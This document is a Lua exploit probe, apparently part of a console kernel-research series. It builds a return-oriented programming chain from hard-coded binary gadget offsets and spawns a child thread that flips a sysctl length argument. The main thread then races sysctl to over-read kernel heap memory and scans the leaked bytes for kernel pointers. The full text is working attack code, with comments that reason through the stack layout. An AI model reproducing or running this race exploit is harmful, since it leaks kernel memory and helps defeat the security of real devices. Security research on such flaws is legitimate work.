-- CRASH_CLASS: MODERATE
-- PROBE 393b: sysctl TOCTOU race — child thread flips oldlenp during copyin
--
-- sysctl reads *oldlenp twice: once to validate, once to copyout.
-- If a child thread changes *oldlenp between reads (small → large),
-- kernel may copy more than validated, leaking kernel heap beyond the
-- sysctl buffer.
--
-- Uses thr_new(455) child with ROP chain to flip the value in a loop.
-- Main thread fires sysctl concurrently.

print("=== PROBE 393b: sysctl TOCTOU race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end
local function fill_sent(buf, len)
    for i = 0, len - 4, 4 do wd(N(buf) + i, 0xDEADDEAD) end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

-- Get eboot base for gadgets
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_addr = uint64(fn_str)
local fn_num = N(fn_addr)

-- eboot base from dynlib_get_info(593)
local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local eboot = text_hi * 0x100000000 + text_lo
print(string.format("eboot=0x%X", eboot))

-- Gadgets (from child thread ROP catalog)
local pop_rax_ret = eboot + 0x992
local pop_rdi_ret = eboot + 0xC9DFE
local pop_rsi_ret = eboot + 0xD77D
local pop_rdx_ret = eboot + 0x3B02D7
local pop_rcx_ret = eboot + 0xE64
local bare_ret = eboot + 0x42
-- mov [rdi], rax; ret — for writing values
local mov_rdi_rax_ret = eboot + 0x92C67

-- Stack layout helper
local function build_u64(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end
local function addr_u64(val)
    local hi = math.floor(val / 0x100000000)
    local lo = val % 0x100000000
    return uint64(string.format("0x%X%08X", hi, lo))
end

-- Shared memory for race
-- oldlenp_shared: the value the child will toggle
-- flag: child runs while flag != 0
local shared = memory.alloc(0x100)
zero_buf(shared, 0x100)
local oldlenp_addr = N(shared)       -- +0x00: the flipping oldlenp
local flag_addr = N(shared) + 0x10   -- +0x10: run flag for child
local result_addr = N(shared) + 0x20 -- +0x20: child iteration counter

-- Values for the race:
-- small_len = actual sysctl data size (will validate)
-- large_len = much bigger (if kernel uses this for copyout, over-read)
local small_len = 0x448   -- kinfo_proc = 1096 bytes = 0x448
local large_len = 0x2000  -- 8KB — would over-read kernel heap

-- Set flag = 1 so child runs
wd(flag_addr, 1)
-- Set initial oldlenp
wd(oldlenp_addr, small_len)
wd(oldlenp_addr + 4, 0)

-- Build child ROP chain: loop writing alternating values to oldlenp_addr
-- The child will:
--   1. Set FS base (fake TCB)
--   2. Loop: write large_len to oldlenp, write small_len to oldlenp
--
-- Since we can't do conditional jumps in ROP, the child will do
-- a fixed number of write pairs then exit. We'll use a long chain.

local STACK_SIZE = 0x10000  -- 64KB
local stack = memory.alloc(STACK_SIZE)
zero_buf(stack, STACK_SIZE)
local stack_base = N(stack)
local stack_top = (stack_base + STACK_SIZE) - (((stack_base + STACK_SIZE) % 16))

-- Fake TCB for child thread
local fake_tcb = memory.alloc(0x1000)
zero_buf(fake_tcb, 0x1000)
-- Self-referencing pointer at +0
wq(N(fake_tcb), fake_tcb)

-- Build ROP chain at stack top
local sp = stack_top - 8  -- leave room for alignment

-- We'll build the chain backwards from the end of stack
-- Each write pair = ~6 gadgets (pop_rdi, pop_rax, mov [rdi] rax)
-- For sysarch: pop_rax(129) pop_rdi(&fake_tcb_ptr) syscall
-- Actually, child needs to call sysarch via fn_addr stub

-- Simpler approach: use the fn_addr syscall stub
-- Each syscall via ROP:
--   pop_rax_ret, syscall_no
--   pop_rdi_ret, arg1
--   pop_rsi_ret, arg2
--   call fn_addr (but we need a call gadget... we have jmp via ret)

-- Actually, from probe 384b, the pattern is:
-- fn_addr is the libkernel syscall stub. We call it with rax=syscall_no.
-- But fn_addr takes rax from the ROP chain, not from a register.
--
-- Wait — from 271g, the child executes arbitrary syscalls via:
-- pop_rax_ret + syscall_no, pop_rdi_ret + arg1, ..., fn_addr
-- fn_addr IS the syscall stub: it does syscall instruction with rax.

-- Let's build the chain. Each syscall call:
-- [pop_rax_ret][syscall_no][pop_rdi_ret][arg1][pop_rsi_ret][arg2]
-- [pop_rdx_ret][arg3][pop_rcx_ret][arg4][fn_addr]

-- First: sysarch(129, &fake_tcb_ptr_buf) to set FS base
local tcb_ptr_buf = memory.alloc(8)
wq(N(tcb_ptr_buf), fake_tcb)

local chain = {}
local function push_q(val)
    chain[#chain + 1] = val
end
local function push_addr(v)
    push_q(addr_u64(v))
end
local function push_syscall(sc_no, a1, a2, a3, a4)
    push_addr(pop_rax_ret)
    push_q(uint64(sc_no))
    push_addr(pop_rdi_ret)
    push_q(a1 or uint64(0))
    push_addr(pop_rsi_ret)
    push_q(a2 or uint64(0))
    push_addr(pop_rdx_ret)
    push_q(a3 or uint64(0))
    push_addr(pop_rcx_ret)
    push_q(a4 or uint64(0))
    push_addr(fn_num)  -- call the syscall stub
end

-- Step 1: sysarch(SET_FSBASE=129, &fake_tcb)
push_syscall(165, uint64(129), uint64(N(tcb_ptr_buf)), uint64(0), uint64(0))

-- Step 2: write loop — alternate large/small values to oldlenp
-- Each write: pop_rdi(oldlenp_addr), pop_rax(value), mov [rdi],rax;ret
local FLIP_COUNT = 500  -- 500 pairs = 1000 writes

for i = 1, FLIP_COUNT do
    -- Write large_len
    push_addr(pop_rdi_ret)
    push_q(uint64(oldlenp_addr))
    push_addr(pop_rax_ret)
    push_q(uint64(large_len))
    push_addr(mov_rdi_rax_ret)

    -- Write small_len
    push_addr(pop_rdi_ret)
    push_q(uint64(oldlenp_addr))
    push_addr(pop_rax_ret)
    push_q(uint64(small_len))
    push_addr(mov_rdi_rax_ret)
end

-- Step 3: write 0 to flag (signal done)
push_addr(pop_rdi_ret)
push_q(uint64(flag_addr))
push_addr(pop_rax_ret)
push_q(uint64(0))
push_addr(mov_rdi_rax_ret)

-- Step 4: thr_exit(431)
push_syscall(431, uint64(0), uint64(0), uint64(0), uint64(0))

-- Write chain to stack
local chain_size = #chain * 8
local chain_start = stack_top - chain_size - 8
print(string.format("chain: %d entries, %d bytes", #chain, chain_size))

-- Check if chain fits
if chain_size > STACK_SIZE - 0x100 then
    print("ERROR: chain too large for stack!")
    print("=== 393b ABORTED ===")
    return
end

for i, val in ipairs(chain) do
    wq(chain_start + (i - 1) * 8, val)
end

-- Set RSP for thr_new
local child_rsp = chain_start

-- Build thr_param struct (0x38 bytes)
local param = memory.alloc(0x38)
zero_buf(param, 0x38)
-- start_func at +0: bare_ret (just start executing from stack)
wq(N(param), addr_u64(bare_ret))
-- arg at +8: not used (stack has the chain)
wq(N(param) + 8, uint64(0))
-- stack_base at +0x10
wq(N(param) + 0x10, uint64(stack_base))
-- stack_size at +0x18
wq(N(param) + 0x18, uint64(STACK_SIZE))
-- child_tid at +0x30
local child_tid = memory.alloc(8)
zero_buf(child_tid, 8)
wq(N(param) + 0x30, uint64(N(child_tid)))

-- Wait, thr_new calls start_func(arg) — arg in rdi
-- start_func IS the first instruction. We need RSP to point to our chain.
-- thr_new sets RSP from stack_base + stack_size (top of stack)
-- Then calls start_func. So the stack pointer IS at the chain.
-- But thr_new pushes a return address first...
--
-- Actually: thr_new(455) puts start_func in RIP and the stack at
-- ((stack_base + stack_size) & ~0xF) - 8
-- So RSP = stack_top - 8 when start_func runs.
-- start_func should be the first gadget (pop_rax_ret).
-- The chain starts at RSP+8 (after the return of start_func).
--
-- Correction: start_func is CALLED, so there's a return address on stack.
-- No — thr_new sets RIP directly, no call. RSP is set.
-- So start_func sees RSP = ((base+size) & ~0xF) - 8
-- We need the chain starting right at that RSP.

-- Recalculate: RSP on entry = ((stack_base + STACK_SIZE) & ~0xF) - 8
local entry_rsp = ((stack_base + STACK_SIZE) - ((stack_base + STACK_SIZE) % 16)) - 8

-- Rewrite chain at entry_rsp
for i, val in ipairs(chain) do
    wq(entry_rsp + (i - 1) * 8, val)
end

-- start_func = bare_ret (ret immediately, popping first chain entry)
-- Wait — if start_func = bare_ret, it does ret which pops [RSP] into RIP.
-- So [RSP] = entry_rsp should be the first gadget.
-- But start_func itself IS at RIP, not on the stack.
-- start_func runs, hits ret, pops [entry_rsp] into RIP.
-- So chain[1] at entry_rsp is the next RIP.

-- Hmm, but thr_new: the kernel sets RIP = start_func, RSP = entry_rsp.
-- start_func(bare_ret) executes ret → pops [entry_rsp] = chain[1] into RIP.
-- Then RSP = entry_rsp + 8, and chain[1] is pop_rax_ret which pops chain[2].
-- This is correct.

-- Actually wait — I need to recheck. In probe 271g the pattern was:
-- start_func = first gadget (pop_rax_ret), not bare_ret
-- Because thr_new sets RIP directly (no push). So RSP is already correct.
-- Let me use start_func = chain[1] = pop_rax_ret directly.

-- Rewrite: put chain starting at entry_rsp, set start_func = pop_rax_ret
-- But then the chain values start at entry_rsp and start_func reads from RSP.
-- start_func = pop_rax_ret → it pops [RSP] = chain[1] into RAX then ret.
-- But chain[1] IS pop_rax_ret (the first push), chain[2] is the syscall_no.
-- That means RAX = pop_rax_ret (address), not syscall_no!
--
-- Fix: start_func sets RIP, so chain on stack should NOT include the first
-- gadget address — it should start with the first VALUE for that gadget.
--
-- So: start_func = pop_rax_ret,
--     [entry_rsp+0] = syscall_no (129 for sysarch)
--     [entry_rsp+8] = pop_rdi_ret (next gadget)
--     [entry_rsp+16] = arg1 value
--     etc.

-- Rebuild chain without the first gadget address
chain = {}
-- sysarch(165): rax=165, rdi=129, rsi=&tcb_ptr_buf
-- start_func = pop_rax_ret, stack starts with values:
push_q(uint64(165))          -- popped into RAX by pop_rax_ret
push_addr(pop_rdi_ret)       -- ret target
push_q(uint64(129))          -- popped into RDI (SET_FSBASE)
push_addr(pop_rsi_ret)
push_q(uint64(N(tcb_ptr_buf)))
push_addr(pop_rdx_ret)
push_q(uint64(0))
push_addr(pop_rcx_ret)
push_q(uint64(0))
push_addr(fn_num)            -- syscall stub

-- Now the flip loop
for i = 1, FLIP_COUNT do
    -- Write large_len to oldlenp
    push_addr(pop_rdi_ret)
    push_q(uint64(oldlenp_addr))
    push_addr(pop_rax_ret)
    push_q(uint64(large_len))
    push_addr(mov_rdi_rax_ret)

    -- Write small_len to oldlenp
    push_addr(pop_rdi_ret)
    push_q(uint64(oldlenp_addr))
    push_addr(pop_rax_ret)
    push_q(uint64(small_len))
    push_addr(mov_rdi_rax_ret)
end

-- Signal done
push_addr(pop_rdi_ret)
push_q(uint64(flag_addr))
push_addr(pop_rax_ret)
push_q(uint64(0))
push_addr(mov_rdi_rax_ret)

-- thr_exit(431)
push_addr(pop_rax_ret)
push_q(uint64(431))
push_addr(pop_rdi_ret)
push_q(uint64(0))
push_addr(fn_num)

-- Check size
chain_size = #chain * 8
print(string.format("chain v2: %d entries, %d bytes", #chain, chain_size))

if chain_size > STACK_SIZE - 0x200 then
    print("ERROR: chain too large!")
    -- Reduce flip count
    FLIP_COUNT = 50
    chain = {}
    push_q(uint64(165))
    push_addr(pop_rdi_ret)
    push_q(uint64(129))
    push_addr(pop_rsi_ret)
    push_q(uint64(N(tcb_ptr_buf)))
    push_addr(pop_rdx_ret)
    push_q(uint64(0))
    push_addr(pop_rcx_ret)
    push_q(uint64(0))
    push_addr(fn_num)

    for i = 1, FLIP_COUNT do
        push_addr(pop_rdi_ret)
        push_q(uint64(oldlenp_addr))
        push_addr(pop_rax_ret)
        push_q(uint64(large_len))
        push_addr(mov_rdi_rax_ret)
        push_addr(pop_rdi_ret)
        push_q(uint64(oldlenp_addr))
        push_addr(pop_rax_ret)
        push_q(uint64(small_len))
        push_addr(mov_rdi_rax_ret)
    end

    push_addr(pop_rdi_ret)
    push_q(uint64(flag_addr))
    push_addr(pop_rax_ret)
    push_q(uint64(0))
    push_addr(mov_rdi_rax_ret)
    push_addr(pop_rax_ret)
    push_q(uint64(431))
    push_addr(pop_rdi_ret)
    push_q(uint64(0))
    push_addr(fn_num)

    chain_size = #chain * 8
    print(string.format("chain v3: %d entries, %d bytes (FLIP=%d)", #chain, chain_size, FLIP_COUNT))
end

-- Write chain to stack at entry_rsp
for i, val in ipairs(chain) do
    wq(entry_rsp + (i - 1) * 8, val)
end

-- Set start_func = pop_rax_ret
wq(N(param), addr_u64(pop_rax_ret))
-- stack_base/size unchanged
wq(N(param) + 0x10, uint64(stack_base))
wq(N(param) + 0x18, uint64(STACK_SIZE))

if not alive() then print("DEAD [setup]"); return end

-- ===================================================================
-- Launch child thread
-- ===================================================================
print("[A] launching child flipper thread")

local ok_thr, rv_thr = pcall(function()
    return mk(455)(uint64(N(param)), uint64(0x38))
end)
print(string.format("thr_new: ret=%d", ok_thr and N(rv_thr) or -999))

if not alive() then print("DEAD [thr_new]"); return end

-- ===================================================================
-- Main thread: fire sysctl in a loop while child flips oldlenp
-- ===================================================================
print("[B] racing sysctl with flipping oldlenp")

-- sysctl: kern.proc.pid.<our_pid> = kinfo_proc (1096 bytes)
local mib = memory.alloc(16)
wd(N(mib), 1)         -- CTL_KERN
wd(N(mib) + 4, 14)    -- KERN_PROC
wd(N(mib) + 8, 1)     -- KERN_PROC_PID
wd(N(mib) + 12, pid_val)

local outbuf = memory.alloc(0x2000)  -- 8KB to catch over-read
local sc_sysctl = mk(202)

local RACE_ROUNDS = 200
local kptr_found = 0
local over_reads = 0

for round = 1, RACE_ROUNDS do
    if not alive() then break end

    fill_sent(outbuf, 0x2000)
    -- oldlenp points to our shared flipping value
    local ok_sc, rv_sc = pcall(function()
        return sc_sysctl(uint64(N(mib)), uint64(4), outbuf,
            uint64(oldlenp_addr), uint64(0), uint64(0))
    end)
    local ret = ok_sc and N(rv_sc) or -999

    if ret == 0 then
        -- Check how many bytes were actually written
        local actual_len = rd(oldlenp_addr) or 0

        -- Check for data past normal kinfo_proc boundary (0x448)
        local past_boundary = false
        for off = 0x448, 0x500, 4 do
            local d = rd(N(outbuf) + off)
            if d ~= nil and d ~= 0xDEADDEAD then
                past_boundary = true
                break
            end
        end

        if past_boundary then
            over_reads = over_reads + 1
            -- Scan the over-read region for kernel pointers
            for off = 0x448, 0x1FF8, 8 do
                local lo = rd(N(outbuf) + off)
                local hi = rd(N(outbuf) + off + 4)
                if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    kptr_found = kptr_found + 1
                    if kptr_found <= 10 then
                        print(string.format("  *** KPTR round=%d +0x%03X: hi=%08X lo=%08X",
                            round, off, hi, lo or 0))
                    end
                end
            end
            if over_reads <= 3 then
                print(string.format("  over-read! round=%d len_now=%d", round, actual_len))
                -- Print a few bytes past boundary
                for off = 0x448, 0x468, 4 do
                    local d = rd(N(outbuf) + off)
                    if d then
                        print(string.format("    +%03X: %08X", off, d))
                    end
                end
            end
        end
    end

    -- Reset oldlenp for next round
    wd(oldlenp_addr, small_len)
    wd(oldlenp_addr + 4, 0)
end

-- Wait for child to finish
local waited = 0
while rd(flag_addr) ~= 0 and waited < 50 do
    -- Busy wait briefly (no sleep available in Lua)
    for i = 1, 10000 do end
    waited = waited + 1
end

print(string.format("  rounds=%d over_reads=%d kptrs=%d child_done=%s",
    RACE_ROUNDS, over_reads, kptr_found,
    rd(flag_addr) == 0 and "yes" or "no"))

if not alive() then print("DEAD [race]"); return end
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 393b COMPLETE ===")
